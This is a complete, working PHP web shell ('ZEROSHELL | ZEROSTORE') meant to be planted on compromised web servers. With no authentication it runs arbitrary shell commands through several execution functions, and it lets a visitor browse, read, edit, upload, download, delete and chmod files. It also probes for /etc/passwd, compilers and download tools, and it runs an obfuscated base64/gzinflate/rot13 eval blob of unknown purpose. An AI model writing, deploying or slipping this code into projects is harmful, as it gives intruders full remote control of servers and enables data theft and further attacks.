<?php
set_time_limit(0);
error_reporting(0);
ini_set('display_errors', FALSE);
date_default_timezone_set("Asia/Jakarta");
$zerostore = get_defined_vars();
if (function_exists("get_defined_vars")) {
  $GLOBALS["zero_get"] = $zerostore["_GET"];
  $GLOBALS["zero_post"] = $zerostore["_POST"];
  $GLOBALS["zero_server"] = $zerostore["_SERVER"];
  $GLOBALS["zero_files"] = $zerostore["_FILES"];
} else {
  $GLOBALS["zero_get"] = $_GET;
  $GLOBALS["zero_post"] = $_POST;
  $GLOBALS["zero_server"] = $_SERVER;
  $GLOBALS["zero_files"] = $_FILES;
}; eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBEeIMwEIDf/RVOhCh1XO3TLB2sndq9jOHDHiYSWaYRW6yeWiD++rWm0MHyktx93GqXZksrayvQFjk0zZP3PCmwuenrx2qOWFGQHdvkP97vknnBD5LkYoc8zegh+cLlxpqUBm0BTgdJCahR428pBI/DY/UckTWJojVMPYWXV8lTVh51DbI5UFS45NhURq8b8EQjd+h04zheXddVgFtL6G0WH1PbF3Fvk4N+hBqjW9r+NK0DZOIQo55mrYZeKEmFx6DrumBv9Ry0tYZ3YCOMtv/wzCAkG40H72p2hv/A+5eW3rch6LlIbaQ/LdQnt8BzqwtozLv0WWjpW6Xnen4B')))));
$GLOBALS["zero_os"] = (substr(strtoupper(PHP_OS), 0, 3) === "WIN") ? "Windows" : "Linux"; 
if(isset($GLOBALS["zero_get"]['file']) && ($GLOBALS["zero_get"]['file'] != '') && ($GLOBALS["zero_get"]['zero_act'] == 'download')) {
  @ob_clean();
  $file = $GLOBALS["zero_get"]['file'];
  header('Content-Description: File Transfer');
  header('Content-Type: application/octet-stream');
  header('Content-Disposition: attachment; filename="'.basename($file).'"');
  header('Expires: 0');
  header('Cache-Control: must-revalidate');
  header('Pragma: public');
  header('Content-Length: ' . filesize($file));
  readfile($file);
  exit;
}
if ($GLOBALS["zero_get"]["zero_act"]) {
  if ($GLOBALS["zero_get"]["zero_act"] == "newfile") {
    if ($GLOBALS["zero_post"]["filename"]) {
      $file = htmlspecialchars($GLOBALS["zero_post"]["filename"]);
      $fp = fopen($file, "a+");
      if (fwrite($fp, $GLOBALS["zero_post"]["content"])) {
        $data = "<br><div class=\"alert alert-success\"> Success Created File <b>" . $GLOBALS["zero_post"]["filename"] . "</b>.</div>";
      } else {
        $data = "<br><div class=\"alert alert-danger\"> Failed Created File </b>" . $GLOBALS["zero_post"]["filename"] . "</b>.</div>";
      }
      echo $data;
      exit;
    }
  }
  else if ($GLOBALS["zero_get"]["zero_act"] == "newfolder") {
    if ($GLOBALS["zero_post"]["folder"]) {
      $fol = zeroPath() . "/" . htmlspecialchars($GLOBALS["zero_post"]["folder"]);
      if (@mkdir($fol)) {
        $data = "<br><div class=\"alert alert-success\"> Success Created Folder <b>" . $GLOBALS["zero_post"]["folder"] . "</b>.</div>";
      } else {
        $data = "<br><div class=\"alert alert-danger\"> Failed Created Folder <b>" . $GLOBALS["zero_post"]["folder"] . "</b>.</div>";
      }
      echo $data;
      exit;
    }
  }
  else if ($GLOBALS["zero_get"]["zero_act"] == "rename") {
    if ($GLOBALS["zero_post"]["oldname"]) {
      $rename = rename(zeroPath() . "/" . $GLOBALS["zero_post"]["oldname"], zeroPath() . "/" . $GLOBALS["zero_post"]["newname"]);
      if ($rename) {
        $data = "<br><div class=\"alert alert-success\"> Success Rename File .</div>";
      } else {
        $data = "<br><div class=\"alert alert-danger\"> Failed Rename File.</div>";
      }
      echo $data;
      exit;
    }
  }
  else if ($GLOBALS["zero_get"]["zero_act"] == "view") {
    echo "<p>Filename : " . writeable($GLOBALS["zero_post"]["filename"], $GLOBALS["zero_post"]["filename"]) . "</p><br>";
    echo "<pre><code>";
    echo htmlspecialchars(@file_get_contents($GLOBALS["zero_post"]["filename"]));
    echo "</code></pre>";
    exit;
  }
  else if ($GLOBALS["zero_get"]["zero_act"] == "viewEdit") {
    echo "<p>Filename : " . writeable($GLOBALS["zero_post"]["filename"], $GLOBALS["zero_post"]["filename"]) . "</p><br>";
    echo "<textarea id=\"zeroTextarea\" class=\"form-control\" rows=\"15\">";
    echo htmlspecialchars(@file_get_contents($GLOBALS["zero_post"]["filename"]));
    echo "</textarea><br>";
    echo "<button id=\"zeroSubmit\" class=\"btn btn-dark ml-3\">Save</button></div>";
    exit;
  }
  else if ($GLOBALS["zero_get"]["zero_act"] == "edit") {
    if ($GLOBALS["zero_post"]["save"]) {
      $save = file_put_contents($GLOBALS["zero_post"]["filename"], $GLOBALS["zero_post"]["content"]);
      if ($save) {
        $data = "<br><div class=\"alert alert-success\"> Success Save File <b>" . $GLOBALS["zero_post"]["filename"] . "</b>.</div>";
      } else {
        $data = "<br><div class=\"alert alert-danger\"> Failed Save File <b>" . $GLOBALS["zero_post"]["filename"] . "</b>.</div>";
      }
      echo $data;
      exit;
    }
  }
  else if ($GLOBALS["zero_get"]["zero_act"] == "chmod") {
    if ($GLOBALS["zero_post"]["chmod"]) {
      $chmod = (chmod(zeroPath() . "/" . $GLOBALS["zero_post"]["filename"], $GLOBALS["zero_post"]["mod"])) ? "<div class=\"alert alert-success\">Chmod Success</div>" : "<div class=\"alert alert-danger\"><strong>Chmod Failed</div>";
      echo $chmod;
      exit;
    }
  }
  else if ($GLOBALS["zero_get"]["zero_act"] == "delete") {
    $del = unlink($GLOBALS["zero_post"]["filename"]);
    if ($del) {
      $data = "<br><div class=\"alert alert-success\"> Success Delete File <b>". $GLOBALS["zero_post"]["filename"] . "</b>.</div>";
    } else {
      $data = "<br><div class=\"alert alert-danger\"> Failed Delete File <b>". $GLOBALS["zero_post"]["filename"] . "</b>.</div>";
    }
    echo $data;
    exit;
  }
  else if ($GLOBALS["zero_get"]["zero_act"] == "unzip") {
    if ($GLOBALS["zero_post"]["filename"]){
      $arcv = new ZipArchive;
      $out = $arcv->open($GLOBALS["zero_post"]["filename"]);
      if ($out === TRUE) {
        $arcv->extractTo($GLOBALS["zero_post"]["to"]);
        $arcv->close();
        $data = "<br><div class=\"alert alert-success\"> Success Unzip File <b>". $GLOBALS["zero_post"]["filename"] . "</b>  to <b>" . $GLOBALS["zero_post"]["to"] . "</b>.</div>";
      } else {
        $data = "<br><div class=\"alert alert-danger\"> Failed Unzip File <b>". $GLOBALS["zero_post"]["filename"] . "</b>.</div>";
      }
      echo $data;
      exit;
    }
  }
  else if ($GLOBALS["zero_get"]["zero_act"] == "upload") {
    if ($GLOBALS["zero_post"]["upload"]) {
      if (isset($GLOBALS["zero_files"]["zero_upl"]["name"])) {
        $name = $GLOBALS["zero_files"]["zero_upl"]["name"];
        $zero = $GLOBALS["zero_files"]["zero_upl"]["tmp_name"];
        if (@copy($zero, zeroPath() . DIRECTORY_SEPARATOR . $name)) {
          $data = "<br><div class=\"alert alert-success\"> Success Upload File <b>" . $name . "</b>.</div>";
        } else {
          $data = "<br><div class=\"alert alert-danger\"> Failed Upload File <b>" . $name . "</b>.</div>";
        }
        echo $data;
        exit;
      }
    }
  }
  else if ($GLOBALS["zero_get"]["zero_act"] == "command") {
    echo zeroCommand($GLOBALS["zero_post"]["command"]);
    exit;
  }
}
?>
<html>
<head>
    <title>ZEROSHELL | ZEROSTORE</title>
    <meta charset="UTF-8">
    <meta name="robots" content="NOINDEX, NOFOLLOW">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://raw.githack.com/con7ext/zerostore-shell/master/resource/css/bootstrap.css">
    <link rel="stylesheet" href="https://raw.githack.com/con7ext/zerostore-shell/master/resource/css/app.css">
    <link rel="shortcut icon" href="https://raw.githubusercontent.com/con7ext/zerostore-shell/master/favicon.png">
    <link href="https://fonts.googleapis.com/css?family=Ubuntu&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <style>
    .zeros {
      margin-bottom: 5px;
    }
    </style>
</head>
<body>
  <div class="container">  
    <section class="scrollable padder">
      <ul class="breadcrumb no-border no-radius b-b b-light pull-in">
        <?php
        $dir = explode("/", zeroPath());
        foreach($dir as $key => $value) {
          echo "<li><a href=\"?path=";
          for($i = 0; $i <= $key; $i++) {
            echo $dir[$i];
            if ($i != $key) {
              echo "/";
            }
          }
          echo "\">" . $value . "</a></li>";
        }
        ?>
      </ul>
      <div class="row">
        <div class="col-md-8">
          <section class="panel panel-default zeropanel">
            <div class="panel-body">
              <?php
              echo zeroInfo();
              ?>
            </div>
          </section>
        </div>
        <div class="col-md-4">
          <section class="panel panel-default zeropanel">
            <div class="panel-body">
              <button id="zeroUpload" class="btn btn-dark ml-3 zeros">Upload</button>
              <button id="zeroCommand" class="btn btn-dark ml-3 zeros">Command</button>
            </div>
          </section>
        </div>
        <div class="col-md-12">
          <section class="panel panel-default zeropanel">
            <div class="panel-body">
              <?php
                if (!is_dir(zeroPath())) die("<div class=\"alert alert-danger\">Directory ". zeroPath() ." is not exists.</div>");
                if (!is_readable(zeroPath())) die("<div class=\"alert alert-danger\">Directory ". zeroPath() ." is not readable.</div>");
              ?>
              <table class="table table-sm">
                <thead>
                  <tr>
                    <th scope="col">Name</th>
                    <th scope="col">Size</th>
                    <th scope="col">Perms</th>
                    <th scope="col">Action</th>
                  </tr>
                </thead>
                <tbody>
                  <?php
                  if (function_exists("opendir")) {
                    if ($opt = opendir(zeroPath())) {
                      while (($read = readdir($opt)) != false) {
                        $dir[] = $read;
                      }
                      closedir();
                    }
                    sort($dir);
                  } else {
                    $dir = scandir(zeroPath());
                  }
                  $ff = 0;
                  foreach ($dir as $zeroFolder) {
                    $paths = zeroPath() . DIRECTORY_SEPARATOR . $zeroFolder;
                    if (!is_dir($paths)) continue;
                    $zero = array(
                      "type" => filetype($paths),
                      "size" => "-",
                      "perms" => writeable($paths, perms($paths)),
                      "action" => "<a id=\"zeroRename_" . $ff++ ."\" value=\"$zeroFolder\">Rename</a> | <a id=\"zeroChmod_" . $ff++ ."\" value=\"$zeroFolder\">Chmod</a>"
                    );
                    if(($zeroFolder != ".") && ($zeroFolder != "..") && ($zeroFolder != "")) {
                      echo "
                      <tr>
                        <td><i class=\"fa fa-folder\" style=\"font-size:30px\"></i> <a href=\"?path=". zeroPath() . "/" . $zeroFolder ."\">$zeroFolder</a></td>
                        <td>" . $zero["size"] . "</td>
                        <td>" . $zero["perms"] . "</td>
                        <td>" . $zero["action"] . "</td>
                      </tr>
                      ";
                    }
                  }
                  $f = 0;
                  foreach($dir as $files) {
                    $paths = zeroPath() . DIRECTORY_SEPARATOR . $files;
                    if(!is_file($paths)) continue;
                    $size = filesize($paths)/1024;
                    $size = round($size, 3);
                    $size = ($size > 1024) ? round($size/1024, 2) . "MB" : $size . "KB";
                    $ex = pathinfo($files, PATHINFO_EXTENSION);
                    if ($ex == "zip") {
                      $anjay = " | <a id=\"zeroUnzip_" . $f++ . "\" value=\"$files\">Unzip</a>";
                    } else {
                      $anjay = "";
                    }
                    $zero = array(
                      "type" => filetype($paths),
                      "size" => $size,
                      "perms" => writeable($paths, perms($paths)),
                      "action" => "<a id=\"zeroEdit_" . $f++ . "\" value=\"$files\">Edit</i></a> | <a id=\"zeroFRename_" . $f++ ."\" value=\"$files\">Rename</a> | <a id=\"zeroFChmod_" . $f++ . "\" value=\"$files\">Chmod</a> | <a id=\"zeroDelete_" . $f++ . "\" value=\"$files\">Delete</a> | <a href=\"?path=" . zeroPath() . "&file=" . $files . "&zero_act=download\">Download</a>$anjay"
                    );
                    echo "
                    <tr>
                      <td><i class=\"fa fa-file-code-o\" style=\"font-size:30px\"></i> <a id=\"zeroView_" . $f++ . "\" value=\"$files\">$files</a></td>
                      <td> " . $zero["size"] . " </td>
                      <td> " . $zero["perms"] . " </td>
                      <td> " . $zero["action"] . " </td>
                    </tr>
                    ";
                  }
                  ?>
                </tbody>
              </table>
            </div>
          </section>
        </div>
      </div>
    </section>
    <div id="zeroModal" class="modal">
      <div class="modal-content">
        <span class="close">&times;</span>
        <div id="zeroContent">
        </div>
      </div>
    </div>
  </div>
  <?php
  function writeable($dir, $perm){
    if(!is_writable($dir)){
      return "<font color=\"#C0392B\">".$perm."</font>";
    }
    else{
      return "<font color=\"#1D8348\">".$perm."</font>";
    }
  }
  function perms($path) {
    $perms = fileperms($path);
    if (($perms & 0xC000) == 0xC000) {
      // Socket
      $info = 's';
    } 
    elseif (($perms & 0xA000) == 0xA000) {
      // Symbolic Link
      $info = 'l';
    } 
    elseif (($perms & 0x8000) == 0x8000) {
      // Regular
      $info = '-';
    } 
    elseif (($perms & 0x6000) == 0x6000) {
      // Block special
      $info = 'b';
    } 
    elseif (($perms & 0x4000) == 0x4000) {
      // Directory
      $info = 'd';
    } 
    elseif (($perms & 0x2000) == 0x2000) {
      // Character special
      $info = 'c';
    } 
    elseif (($perms & 0x1000) == 0x1000) {
      // FIFO pipe
      $info = 'p';
    } 
    else {
      // Unknown
      $info = 'u';
    }
      // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
    (($perms & 0x0800) ? 's' : 'x' ) :
    (($perms & 0x0800) ? 'S' : '-'));
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
    (($perms & 0x0400) ? 's' : 'x' ) :
    (($perms & 0x0400) ? 'S' : '-'));
    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
    (($perms & 0x0200) ? 't' : 'x' ) :
    (($perms & 0x0200) ? 'T' : '-'));
  
    return $info;
  }
  function zeroPath() {
    if (isset($GLOBALS["zero_get"]["path"])) {
      $dir = str_replace("\\", "/", $GLOBALS["zero_get"]["path"]);
      @chdir($dir);
    } else {
      if (function_exists("getcwd")) {
        $dir = str_replace("\\", "/", getcwd());
      } else {
        $dir = str_replace("\\", "/", $GLOBALS["zero_server"]["PWD"]);
      }
    }
    return $dir;
  }
  function zeroInfo() {
    $ip = gethostbyname($_SERVER['HTTP_HOST']);
    $safe = (@ini_get(strtolower("safe_mode")) == 'on') ? color("ON", "red") : color("OFF", "green");
    $mysql = (is_callable("mysql_connect")) ? color("ON", "green") : color("OFF", "red");
    $curl = (is_callable("curl_version")) ? color("ON", "green") : color("OFF", "red");
    $etcPass = (is_readable("/etc/passwd")) ? color("OK", "green") : color("BAD", "red");
    $wget = (zeroCommand('wget --help')) ? color("ON", "green") : color("OFF", "red");
    $perl = (zeroCommand('perl --help')) ? color("ON", "green") : color("OFF", "red");
    $python = (zeroCommand('python --help')) ? color("ON", "green") : color("OFF", "red");
    $ruby = (zeroCommand('ruby --help')) ? color("ON", "green") : color("OFF", "red");
    $gcc = (zeroCommand('gcc --help')) ? color("ON", "green") : color("OFF", "red");
    $dis = @ini_get("disable_functions");
    $dfunc = (!empty($dis)) ? "<a id=\"zero_dfunc\">See Disable Function</a>" : color("OFF", "green");
    return "
    <b>UNAME</b> <span id='uname'>" . php_uname() . "</span><br>
    <b>ADDR</b> <span id='addr'>" . $ip . " | " . $GLOBALS["zero_server"]["REMOTE_ADDR"] ."</span><br>
    <b>SAFE</b> " . $safe . "<br>
    <b>MYSQL</b> " . $mysql . " | <b>CURL</b> " . $curl . " | <b>WGET</b> " . $wget . " | <b>PERL</b> " . $perl . " | <b>PYTHON</b> " . $python ." | <b>RUBY</b> " . $ruby ." | <b>GCC</b> " . $gcc . "<br>
    <b>DISABLE FUNCTION</b> " .$dfunc . "<br>
    <button id=\"zeroNewFile\" class=\"btn btn-dark ml-3\">New File</button> | <button id=\"zeroNewFolder\" class=\"btn btn-dark ml-3\">New Folder</button><br>
    ";
  }
  function color($str, $col) {
    $color = [
      "green" => "#1D8348",
      "red" => "#C0392B"
    ];
    return "<font color=\"" . $color[$col] . "\">" . $str . "</font>";
  }
  function zeroCommand($cmd) {
    if (function_exists("popen")) {
      $zero = popen($cmd, 'r');
      $zero = fread($zero, 2096);
      pclose($zero);
      return $zero;
    }
    else if(function_exists("proc_open")) {
      $zero = proc_open($cmd, array(
        0 => array("pipe", 'r'),
        1 => array("pipe", "w"),
        2 => array("pipe", "w")
      ), $store, zeroPath());
      $stdout = stream_get_contents($store[1]);
      fclose($store[1]);
      return $stdout;
    }
    else if(function_exists('system')) { 		
      @ob_start(); 		
      @system($cmd); 		
      $buff = @ob_get_contents(); 		
      @ob_end_clean(); 		
      return $buff; 	
    } else if(function_exists('exec')) { 		
      @exec($cmd,$results); 		
      $buff = ""; 		
      foreach($results as $result) { 			
        $buff .= $result; 		
      } return $buff; 	
    } else if(function_exists('passthru')) { 		
      @ob_start(); 		
      @passthru($cmd); 		
      $buff = @ob_get_contents(); 		
      @ob_end_clean(); 		
      return $buff; 	
    } else if(function_exists('shell_exec')) { 		
      $buff = @shell_exec($cmd); 		
      return $buff; 	
    } 
  }
  ?>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js" type="text/javascript"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
  <script type="text/javascript">
  $(document).ready(function(){
    "use strict";
    var path = "<?php echo zeroPath(); ?>";
    $(".close").on("click", function () {
      $("#zeroModal").hide();
    });
    $("a[id^='zeroRename_']").on("click", function () {
      var val = $(this).attr("value")
      $("#zeroContent").html("<div class=\"form-inline\"><input id=\"zeroInput\" class=\"form-control\" type=\"text\" name=\"filename\" value=\""+ val + "\"><button id=\"zeroSubmit\" class=\"btn btn-dark ml-3\">Rename</button></div>");
      $("#zeroSubmit").on("click", function () {
        $.ajax({
          type: "POST",
          url: "?path=" + path + "&zero_act=rename",
          data: "oldname=" + val +"&newname=" + $("#zeroInput").val(),
          success: function(zeroResult) {
            $("#zeroContent").append(zeroResult)
          }
        });
      });
      $('#zeroModal').show();
    });
    $("a[id^='zeroFRename_']").on("click", function () {
      var val = $(this).attr("value")
      $("#zeroContent").html("<div class=\"form-inline\"><input id=\"zeroInput\" class=\"form-control\" type=\"text\" name=\"filename\" value=\""+ val + "\"><button id=\"zeroSubmit\" class=\"btn btn-dark ml-3\">Rename</button></div>");
      $("#zeroSubmit").on("click", function () {
        $.ajax({
          type: "POST",
          url: "?path=" + path + "&zero_act=rename",
          data: "oldname=" + val +"&newname=" + $("#zeroInput").val(),
          success: function(zeroResult) {
            $("#zeroContent").append(zeroResult)
          }
        });
      });
      $('#zeroModal').show();
    });
    $("a[id^='zeroView_']").on("click", function () {
      var attrs = $(this).attr("value")
      $("#zeroContent").html("<div class=\"progress progress-striped active\"><div class=\"progress-bar progress-bar-warning\" style=\"width: 100%\"></div></div></div>")
      $.ajax({
        type: "POST",
        url: "?path=" + path + "&zero_act=view",
        data: "filename=" + attrs,
        success: function (zeroResult) {
          $("#zeroContent").html(zeroResult)
        }
      });
      $("#zeroModal").show();
    });
    $("a[id^='zeroEdit_']").on("click", function () {
      var attrs = $(this).attr("value")
      $("#zeroContent").html("<div class=\"progress progress-striped active\"><div class=\"progress-bar progress-bar-warning\" style=\"width: 100%\"></div></div></div>");
      $.ajax({
        type: "POST",
        url: "?path=" + path + "&zero_act=viewEdit",
        data: "filename=" + attrs,
        success: function (zeros) {
          $("#zeroContent").html(zeros);
          $("#zeroSubmit").on("click", function () {
            var content = $("#zeroTextarea").val()
            $.ajax({
              type: "POST",
              url: "?path=" + path +"&zero_act=edit",
              data: "save=yes&filename=" + attrs + "&content=" + content,
              success: function (zeroResult) {
                $("#zeroContent").append("<br>" + zeroResult)
              }
            });
          });
        }
      });
      $("#zeroModal").show();
    });
    $("#zero_dfunc").on("click", function () {
      $("#zeroContent").html("<pre><code><?php echo @ini_get("disable_functions"); ?></code></pre>")
      $("#zeroModal").show();
    });
    $("a[id^='zeroChmod_']").on("click", function () {
      var attrs = $(this).attr("value")
      $("#zeroContent").html("<div class=\"form-inline\"><input type=\"text\" id=\"zeroFile\" class=\"form-control\" value=\"" + attrs + "\"><input type=\"text\" id=\"zeroMod\" class=\"form-control\" placeholder=\"0777\"><button id=\"zeroSubmit\" class=\"btn btn-dark ml-3\">Chmod</button></div>")
      $("#zeroSubmit").on("click", function () {
        var filename = $("#zeroFile").val()
        var mod = $("#zeroMod").val()
        $.ajax({
          type: "POST",
          url: "?path=" + path + "&zero_act=chmod",
          data: "chmod=yes&filename=" + filename + "&mod=" + mod,
          success: function (result) {
            $("#zeroContent").append("<br>" + result)
          }
        });
      });
      $("#zeroModal").show()
    });
    $("a[id^='zeroFChmod_']").on("click", function () {
      var attrs = $(this).attr("value")
      $("#zeroContent").html("<div class=\"form-inline\"><input type=\"text\" id=\"zeroFile\" class=\"form-control\" value=\"" + attrs + "\"><input type=\"text\" id=\"zeroMod\" class=\"form-control\" placeholder=\"0777\"><button id=\"zeroSubmit\" class=\"btn btn-dark ml-3\">Chmod</button></div>")
      $("#zeroSubmit").on("click", function () {
        var filename = $("#zeroFile").val()
        var mod = $("#zeroMod").val()
        $.ajax({
          type: "POST",
          url: "?path=" + path + "&zero_act=chmod",
          data: "chmod=yes&filename=" + filename + "&mod=" + mod,
          success: function (result) {
            $("#zeroContent").append("<br>" + result)
          }
        });
      });
      $("#zeroModal").show()
    });
    $("a[id^='zeroDelete_']").on("click", function () {
      var dir = $(this).attr("value")
      $("#zeroContent").html("<h2 class=\"text-center\"> Are You sure want to delete <b>" + dir + "</b>?</h2><br><button id=\"zeroSubmit\"class=\"btn btn-dark ml-3\">Yes</button>")
      $("#zeroSubmit").on("click", function () {
        $.ajax({
          type: "POST",
          url: "?path=" + path + "&zero_act=delete",
          data: "filename=" + dir,
          success: function (result) {
            $("#zeroContent").append("<br>" + result)
          }
        })
      });
      $("#zeroModal").show()
    });
    $("#zeroNewFile").on("click", function () {
      $("#zeroContent").html("<div class=\"form-inline\"><input id=\"zeroInput\" type=\"text\" class=\"form-control\" placeholder=\"New File Name\"><button id=\"zeroSubmit\" class=\"btn btn-dark ml-3\">Create File</button></div><textarea id=\"zeroTextarea\" class=\"form-control\" rows=\"15\"></textarea>")
      $("#zeroSubmit").on("click", function () {
        var newFile = $("#zeroInput").val()
        var content = $("#zeroTextarea").val()
        $.ajax({
          type: "POST",
          url: "?path=" + path + "&zero_act=newfile",
          data: "filename=" + newFile + "&content=" + content,
          success: function (result) {
            $("#zeroContent").append("<br>" + result)
          }
        })
      })
      $("#zeroModal").show()
    });
    $("#zeroNewFolder").on("click", function () {
      $("#zeroContent").html("<div class=\"form-inline\"><input id=\"zeroInput\" type=\"text\" class=\"form-control\" placeholder=\"New Folder Name\"><button id=\"zeroSubmit\" class=\"btn btn-dark ml-3\">Create Folder</button></div>")
      $("#zeroSubmit").on("click", function () {
        var newFile = $("#zeroInput").val()
        $.ajax({
          type: "POST",
          url: "?path=" + path + "&zero_act=newfolder",
          data: "folder=" + newFile,
          success: function (result) {
            $("#zeroContent").append("<br>" + result)
          }
        })
      })
      $("#zeroModal").show()
    });
    $("a[id^='zeroUnzip_']").on("click", function () {
      var file = $(this).attr("value")
      $("#zeroContent").html("<div class=\"form-inline\"><input type=\"text\" id=\"zeroFile\" class=\"form-control\" value=\"" + file + "\"><input type=\"text\" id=\"zeroDest\" class=\"form-control\" placeholder=\"Destination Folder\"><button id=\"zeroSubmit\" class=\"btn btn-dark ml-3\">Unzip</button></div>")
      $("#zeroSubmit").on("click", function () {
        var files = $("#zeroFile").val()
        var dest = $("#zeroDest").val()
        $.ajax({
          type: "POST",
          url: "?path=" + path + "&zero_act=unzip",
          data: "filename=" + files + "&to=" + dest,
          success: function (result) {
            $("#zeroContent").append("<br>" + result)
          }
        })
      })
      $("#zeroModal").show()
    });
    $("#zeroUpload").on("click", function () {
      $("#zeroContent").html("<form id=\"zeroPOST\" action=\"?path=" + path +"&zero_act=upload\" enctype=\"multipart/form-data\" method=\"post\" class=\"form-inline\"><input type=\"file\" name=\"zero_upl\" class=\"form_control\"><input type=\"submit\" name=\"upload\" value=\"Upload\" class=\"form-control\"></form>")
      $("#zeroPOST").submit(
        function () {
          $.ajax({
            url: "?path=" + path + "&zero_act=upload",
            type: "POST",
            data: new FormData( this ),
            processData: false,
            contentType: false,
            success: function (result) {
              $("#zeroContent").append("<br>" + result)
            }
          });
        }
      )
      $("#zeroModal").show()
    });
    $("#zeroCommand").on("click", function () {
      $("#zeroContent").html("<pre><code id=\"zeroCMD\"></code></pre><div class=\"form-inline\"><input type=\"text\" id=\"zeroInput\" class=\"form-control\"><button id=\"zeroSubmit\" class=\"btn btn-dark ml-3\">Execute</button></div>")
      $("#zeroSubmit").on("click", function () {
        var cmd = $("#zeroInput").val()
        $.ajax({
          type: "POST",
          url: "?path=" + path + "&zero_act=command",
          data: "command=" + cmd,
          success: function (result) {
            $("#zeroCMD").html(result)
          }
        })
      })
      $("#zeroModal").show()
    })
  });
  </script>
</body>
</html>
